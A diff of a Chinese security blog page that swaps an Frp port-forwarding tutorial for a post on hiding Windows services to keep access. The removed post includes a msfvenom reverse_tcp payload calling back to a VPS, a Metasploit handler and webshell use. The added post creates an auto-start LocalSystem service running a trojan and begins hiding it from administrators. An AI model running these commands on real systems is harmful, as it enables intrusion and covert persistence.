@@ -15,30 +15,22 @@
 <link rel="stylesheet" href="/css/tags.css" media="all">
 
 
-<meta name="description" content="Frp简介这是一款基于服务端和客户端之间建立通信后，将客户端的某个端口转发到服务端访问">
+<meta name="description" content="简介sc.exe是Windows系统文件中自带的服务管理程序，可远程对服务进行操作；这里讲述了利用SC和Powershell程序来隐藏服务，搭到长期维持权限的效果。 SC实现创建服务创建一个服务名为demo的自启动服务，服务运行地址指向木马路径，以tcpip协议传输并以本地系统权限运行sc create demo start&#x3D; auto binPath&#x3D; &quot;cmd.exe &#x2F;k C:\t">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Frp内网转发&#x2F;穿透使用">
-<meta property="og:url" content="https://www.tu3k.cn/2020/12/28/frp/index.html">
+<meta property="og:title" content="SC和Powershell实现隐藏Windows服务维持权限">
+<meta property="og:url" content="https://www.tu3k.cn/2021/01/10/sc-powershell-serivces-yincang/index.html">
 <meta property="og:site_name">
-<meta property="og:description" content="Frp简介这是一款基于服务端和客户端之间建立通信后，将客户端的某个端口转发到服务端访问">
+<meta property="og:description" content="简介sc.exe是Windows系统文件中自带的服务管理程序，可远程对服务进行操作；这里讲述了利用SC和Powershell程序来隐藏服务，搭到长期维持权限的效果。 SC实现创建服务创建一个服务名为demo的自启动服务，服务运行地址指向木马路径，以tcpip协议传输并以本地系统权限运行sc create demo start&#x3D; auto binPath&#x3D; &quot;cmd.exe &#x2F;k C:\t">
 <meta property="og:locale" content="en_US">
-<meta property="og:image" content="https://www.tu3k.cn/images/frp/1.png">
-<meta property="og:image" content="https://www.tu3k.cn/images/frp/2.png">
-<meta property="og:image" content="https://www.tu3k.cn/images/frp/3.png">
-<meta property="og:image" content="https://www.tu3k.cn/images/frp/4.png">
-<meta property="og:image" content="https://www.tu3k.cn/images/frp/5.png">
-<meta property="og:image" content="https://www.tu3k.cn/images/frp/6.png">
-<meta property="og:image" content="https://www.tu3k.cn/images/frp/7.png">
-<meta property="og:image" content="https://www.tu3k.cn/images/frp/8.png">
-<meta property="og:image" content="https://www.tu3k.cn/images/frp/9.png">
-<meta property="og:image" content="https://www.tu3k.cn/images/frp/10.png">
-<meta property="og:image" content="https://www.tu3k.cn/images/frp/11.png">
-<meta property="og:image" content="https://www.tu3k.cn/images/frp/12.png">
-<meta property="article:published_time" content="2020-12-28T08:45:11.000Z">
-<meta property="article:modified_time" content="2021-01-05T09:29:13.789Z">
-<meta property="article:tag" content="Frp内网转发">
+<meta property="og:image" content="https://www.tu3k.cn/images/sc_powershell/1.png">
+<meta property="og:image" content="https://www.tu3k.cn/images/sc_powershell/2.png">
+<meta property="og:image" content="https://www.tu3k.cn/images/sc_powershell/3.png">
+<meta property="og:image" content="https://www.tu3k.cn/images/sc_powershell/4.png">
+<meta property="article:published_time" content="2021-01-10T05:51:26.000Z">
+<meta property="article:modified_time" content="2021-01-10T06:54:35.947Z">
+<meta property="article:tag" content="维持权限">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://www.tu3k.cn/images/frp/1.png">
+<meta name="twitter:image" content="https://www.tu3k.cn/images/sc_powershell/1.png">
 
 
     <link rel="icon" href="/images/favicon.ico">
@@ -72,7 +64,7 @@
 <link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
 
 
-<title>Frp内网转发/穿透使用 | Tu3k's Blog</title>
+<title>SC和Powershell实现隐藏Windows服务维持权限 | Tu3k's Blog</title>
 
 <script src="//cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
 <script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
@@ -281,11 +273,11 @@
     </div>
     <link class="menu-list" tags="Tags" friends="Friends" about="About Me"/>
 </nav>
-      <div class="body-wrap"><article id="post-frp" class="article article-type-post" itemscope itemprop="blogPost">
+      <div class="body-wrap"><article id="post-sc-powershell-serivces-yincang" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
-      <a href="/2020/12/28/frp/" class="article-date">
-      <time datetime="2020-12-28T08:45:11.000Z" itemprop="datePublished">2020-12-28</time>
+      <a href="/2021/01/10/sc-powershell-serivces-yincang/" class="article-date">
+      <time datetime="2021-01-10T05:51:26.000Z" itemprop="datePublished">2021-01-10</time>
 </a>
 
 
@@ -300,7 +292,7 @@
         
   
     <h1 class="article-title" itemprop="name">
-      Frp内网转发/穿透使用
+      SC和Powershell实现隐藏Windows服务维持权限
     </h1>
   
 
@@ -311,7 +303,7 @@
 
         
     <div class="article-tag tagcloud">
-        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Frp%E5%86%85%E7%BD%91%E8%BD%AC%E5%8F%91/" rel="tag">Frp内网转发</a></li></ul>
+        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E7%BB%B4%E6%8C%81%E6%9D%83%E9%99%90/" rel="tag">维持权限</a></li></ul>
     </div>
 
         <div class="clearfix"></div>
@@ -321,21 +313,10 @@
 <div class="article-entry" itemprop="articleBody">
     
         
-        <h2 id="Frp简介"><a href="#Frp简介" class="headerlink" title="Frp简介"></a>Frp简介</h2><p><strong>这是一款基于服务端和客户端之间建立通信后，将客户端的某个端口转发到服务端访问</strong></p>
-<a id="more"></a>
-<h2 id="使用教程"><a href="#使用教程" class="headerlink" title="使用教程"></a>使用教程</h2><p>下载地址：<code>https://github.com/fatedier/frp/releases</code><br>服务端：linux_amd64<br>客户端：windows_amd64<br><img src="https://www.tu3k.cn/images/frp/1.png" alt="frp_github" title="frp_github"><br>原理：自认为好理解。用一个端口(<code>bind_port = 5000</code>)将服务端和客户端产生通信，设置服务(frps.ini)和客户端(frpc.ini)相关参数，启动程序(frps.exe和frpc.exe)并指定程序文件(frps.ini和frpc.ini)，转发成功。<br><img src="https://www.tu3k.cn/images/frp/2.png" alt="frp_github1" title="frp_github1"><br>windows和linux都有这俩块文件，所以两个系统都可以转发内网到外网。<br>服务器IP：<code>kali——192.168.235.130</code><br>客户端IP：<code>Win10—192.168.1.155</code></p>
-<h3 id="0x01-WEB端的转发"><a href="#0x01-WEB端的转发" class="headerlink" title="0x01 WEB端的转发"></a>0x01 WEB端的转发</h3><p>服务端：<br>首先解压文件：<code>tar zxvf frp_0.34.3_linux_amd64.tar.gz</code><br>重命名文件夹：<code>mv frp_0.34.3_linux_amd64/ frp</code><br>使用root权限进行修改：<code>sudo gedit frps.ini</code><br><img src="https://www.tu3k.cn/images/frp/3.png" alt="frp_github2" title="frp_github2"><br>9999该端口就是以后访问web服务需要用到的端口  <code>192.168.235.130:9999</code>，访问这个链接就会链接到我们的内网地址，内网地址设置在后面有说。<br>保存退出，启动服务<br><code>./frps -c ./frps.ini</code><br><img src="https://www.tu3k.cn/images/frp/4.png" alt="frp_github3" title="frp_github3"><br>服务端配置完成。<br>客户端：<br>打开frpc.ini<br><img src="https://www.tu3k.cn/images/frp/5.png" alt="frp_github4" title="frp_github4"></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[common]</span><br><span class="line">server_addr &#x3D; 192.168.235.130         &#x2F;&#x2F;服务端的地址</span><br><span class="line">server_port &#x3D; 5000                与服务端建立通信的地址  也就是最上面提到的5000</span><br><span class="line">[服务]</span><br><span class="line">type &#x3D; http&#x2F;https                &#x2F;&#x2F;如果是https就写https    注意不要写错 不然接受转发不了</span><br><span class="line">local_ip &#x3D; 内网ip</span><br><span class="line">local_port &#x3D; 内网web服务端口或者其他服务端口</span><br><span class="line">custom_domains &#x3D; vps域名或IP</span><br></pre></td></tr></table></figure>
-<p>例：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[web]</span><br><span class="line">type &#x3D; http</span><br><span class="line">local_ip &#x3D; 192.168.1.155</span><br><span class="line">local_port &#x3D; 8080</span><br><span class="line">custom_domain &#x3D; 192.168.235.130</span><br></pre></td></tr></table></figure>
-<p>保存退出，打开cmd切到frp目录启动<br><code>frpc.exe -c frpc.ini</code><br><img src="https://www.tu3k.cn/images/frp/6.png" alt="frp_github5" title="frp_github5"><br>客户端设置完成。<br>此时访问vps ip：<code>http://192.168.235.130:9999/</code><br><img src="https://www.tu3k.cn/images/frp/7.png" alt="frp_github6" title="frp_github6"><br>就访问到了我们本机phpinfo。</p>
-<h3 id="0x02-3389端口转发"><a href="#0x02-3389端口转发" class="headerlink" title="0x02 3389端口转发"></a>0x02 3389端口转发</h3><p>只需在frpc.ini中添加</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[rdp]</span><br><span class="line">type &#x3D; tcp</span><br><span class="line">local_ip &#x3D; 192.168.1.155</span><br><span class="line">local_port &#x3D; 3389</span><br><span class="line">remote_port &#x3D; 2030</span><br></pre></td></tr></table></figure>
-<p><img src="https://www.tu3k.cn/images/frp/8.png" alt="rdp" title="rdp"><br>3389是内网的远程端口，必须要开着才可以转发，2030是转发到外网的2030端口 进行连接，这里是转发到了我kali的2030，所以直接连接  kali-ip:2030  即可登录我的windows主机。<br><img src="https://www.tu3k.cn/images/frp/9.png" alt="rdp" title="rdp"></p>
-<h3 id="0x03-应用场景"><a href="#0x03-应用场景" class="headerlink" title="0x03 应用场景"></a>0x03 应用场景</h3><h4 id="0x03-①"><a href="#0x03-①" class="headerlink" title="0x03 ①"></a>0x03 ①</h4><p>webshell中可以先配置好ini文件然后上传客户端脚本到可执行目录<br>执行frpc.exe -c frpc.ini<br>有时候远程端口不是3389，需要手动去寻找一下远程端口是多少，再修改运行<br>接着我们本机连接vps-ip:转发的端口号  即可</p>
-<h4 id="0x03-②"><a href="#0x03-②" class="headerlink" title="0x03 ②"></a>0x03 ②</h4><p>将msf转发出网，接受反弹的shell<br>首先将服务端文件传到vps上面，配置好通信端口和转发端口 开始运行<br>注意：因为msf监听的payload是tcp 所以这里也要设置tcp<br><img src="https://www.tu3k.cn/images/frp/10.png" alt="msf" title="msf"><br>kali内也设置好类型为tcp<br><img src="https://www.tu3k.cn/images/frp/11.png" alt="msf1" title="msf1"><br>设置完毕启动后，在进行tcp访问vps的2222端口时，会转发到kali的4466端口上，建立shell连接。<br>首先创建payload<br><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=154.XXX.XXX.135 LPORT=2222 -f exe &gt; shell.exe</code><br>将payload传到目标机器，kali内msf设置监听4466端口</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit&#x2F;multi&#x2F;handler</span><br><span class="line">set payload windows&#x2F;meterpreter&#x2F;reverse_tcp</span><br><span class="line">set LHOST 192.168.235.130</span><br><span class="line">set LPORT 4466</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
-<p>目标机器执行payload，tcp先会去连接vps的端口，然后vps端口转发到我们kali的4466.形成反弹shell<br><img src="https://www.tu3k.cn/images/frp/12.png" alt="msf1" title="msf1"></p>
+        <h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>sc.exe是Windows系统文件中自带的服务管理程序，可远程对服务进行操作；这里讲述了利用SC和Powershell程序来隐藏服务，搭到长期维持权限的效果。</p>
+<h3 id="SC实现"><a href="#SC实现" class="headerlink" title="SC实现"></a>SC实现</h3><h4 id="创建服务"><a href="#创建服务" class="headerlink" title="创建服务"></a>创建服务</h4><p>创建一个服务名为demo的自启动服务，服务运行地址指向木马路径，以tcpip协议传输并以本地系统权限运行<br><code>sc create demo start= auto binPath= &quot;cmd.exe /k C:\tu.exe&quot; depend= Tcpip obj= Localsystem</code><br>添加个描述<br><code>sc description demo &quot;tu3k.cn&quot;</code><br><img src="https://www.tu3k.cn/images/sc_powershell/1.png" alt="sc_powershell" title="sc_powershell"><br>这时服务器重启会自启动上线，手动启动也可以上线，不过有时候手动可能会出错，但是不影响上线。<br><img src="https://www.tu3k.cn/images/sc_powershell/2.png" alt="sc_powershell" title="sc_powershell"><br>成功上线<br><img src="https://www.tu3k.cn/images/sc_powershell/3.png" alt="cs" title="cs"><br>删除进程命令<code>sc delete demo</code><br>但是管理员在进行维护的时候，发现这个进程可疑，就会查看这个进程的详细信息<br><img src="https://www.tu3k.cn/images/sc_powershell/4.png" alt="cs" title="cs"><br>我们的木马路径藏的再隐蔽也一览无余了，接着管理员就会执行命令删掉服务，权限也就掉了，如何藏得更深或者管理员没有这个权限去删呢再或者管理员根本发现不了我们的隐藏木马进程</p>
+<p>下面是正文：</p>
+<h4 id="隐藏服务"><a href="#隐藏服务" class="headerlink" title="隐藏服务"></a>隐藏服务</h4><p>为了不让管理员发现用于权限维持的服务，通过SDDL修改服务的安全描述符，安全描述符是用来配置该服务允许哪些用户权限访问<br>使用sc程序的sdset模块修改</p>
 
     
 </div>
@@ -344,13 +325,13 @@
   
     
     <div class="copyright">
-        <p><span>Title:</span><a href="/2020/12/28/frp/">Frp内网转发/穿透使用</a></p>
+        <p><span>Title:</span><a href="/2021/01/10/sc-powershell-serivces-yincang/">SC和Powershell实现隐藏Windows服务维持权限</a></p>
         <p><span>Author:</span><a href="/" title="Back to Homepage"></a></p>
-        <p><span>Created:</span>2020-12-28, 16:45:11</p>
-        <p><span>Updated:</span>2021-01-05, 17:29:13</p>
+        <p><span>Created:</span>2021-01-10, 13:51:26</p>
+        <p><span>Updated:</span>2021-01-10, 14:54:35</p>
         <p>
-            <span>Full URL:</span><a class="post-url" href="/2020/12/28/frp/" title="Frp内网转发/穿透使用">https://www.tu3k.cn/2020/12/28/frp/</a>
-            <span class="copy-path" data-clipboard-text="From https://www.tu3k.cn/2020/12/28/frp/　　By " title="Copy Article&#39;s Link &amp; Author"><i class="fa fa-clipboard"></i></span>
+            <span>Full URL:</span><a class="post-url" href="/2021/01/10/sc-powershell-serivces-yincang/" title="SC和Powershell实现隐藏Windows服务维持权限">https://www.tu3k.cn/2021/01/10/sc-powershell-serivces-yincang/</a>
+            <span class="copy-path" data-clipboard-text="From https://www.tu3k.cn/2021/01/10/sc-powershell-serivces-yincang/　　By " title="Copy Article&#39;s Link &amp; Author"><i class="fa fa-clipboard"></i></span>
             <script> var clipboard = new Clipboard('.copy-path'); </script>
         </p>
         <p>
@@ -362,16 +343,10 @@
 
     <nav id="article-nav">
         
-            <div id="article-nav-newer" class="article-nav-title">
-                <a href="/2020/12/29/kerberos-study/">
-                    个人理解kerberos的作用和运行流程
-                </a>
-            </div>
-        
         
             <div id="article-nav-older" class="article-nav-title">
-                <a href="/2020/12/28/edu_bug/">
-                    某教育系统的基础漏洞检测
+                <a href="/2021/01/09/74cms-tempelate-log-include-shell/">
+                    骑士CMS 模板文件日志包含Getshell
                 </a>
             </div>
         
@@ -383,7 +358,7 @@
     <div id="toc" class="toc-article">
         <strong class="toc-title">Contents</strong>
         
-            <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Frp%E7%AE%80%E4%BB%8B"><span class="toc-number">1.</span> <span class="toc-text">Frp简介</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B"><span class="toc-number">2.</span> <span class="toc-text">使用教程</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x01-WEB%E7%AB%AF%E7%9A%84%E8%BD%AC%E5%8F%91"><span class="toc-number">2.1.</span> <span class="toc-text">0x01 WEB端的转发</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x02-3389%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91"><span class="toc-number">2.2.</span> <span class="toc-text">0x02 3389端口转发</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x03-%E5%BA%94%E7%94%A8%E5%9C%BA%E6%99%AF"><span class="toc-number">2.3.</span> <span class="toc-text">0x03 应用场景</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#0x03-%E2%91%A0"><span class="toc-number">2.3.1.</span> <span class="toc-text">0x03 ①</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x03-%E2%91%A1"><span class="toc-number">2.3.2.</span> <span class="toc-text">0x03 ②</span></a></li></ol></li></ol></li></ol>
+            <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AE%80%E4%BB%8B"><span class="toc-number">1.</span> <span class="toc-text">简介</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#SC%E5%AE%9E%E7%8E%B0"><span class="toc-number">1.1.</span> <span class="toc-text">SC实现</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%9B%E5%BB%BA%E6%9C%8D%E5%8A%A1"><span class="toc-number">1.1.1.</span> <span class="toc-text">创建服务</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%9A%90%E8%97%8F%E6%9C%8D%E5%8A%A1"><span class="toc-number">1.1.2.</span> <span class="toc-text">隐藏服务</span></a></li></ol></li></ol></li></ol>
         
     </div>
     <style>
@@ -419,7 +394,7 @@
         </div>
         <script>
             window._bd_share_config={
-                "common":{"bdSnsKey":{},"bdText":"Frp内网转发/穿透使用　| 　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
+                "common":{"bdSnsKey":{},"bdText":"SC和Powershell实现隐藏Windows服务维持权限　| 　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
         </script>
     
 
@@ -439,15 +414,13 @@
 
     <div class="scroll" id="post-nav-button">
         
-            <a href="/2020/12/29/kerberos-study/" title="Pre: 个人理解kerberos的作用和运行流程">
-                <i class="fa fa-angle-left"></i>
-            </a>
+            <a href="/" title="Back to Homepage"><i class="fa fa-home"></i></a>
         
 
         <a title="Mini Archives"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
 
         
-            <a href="/2020/12/28/edu_bug/" title="Next: 某教育系统的基础漏洞检测">
+            <a href="/2021/01/09/74cms-tempelate-log-include-shell/" title="Next: 骑士CMS 模板文件日志包含Getshell">
                 <i class="fa fa-angle-right"></i>
             </a>
         
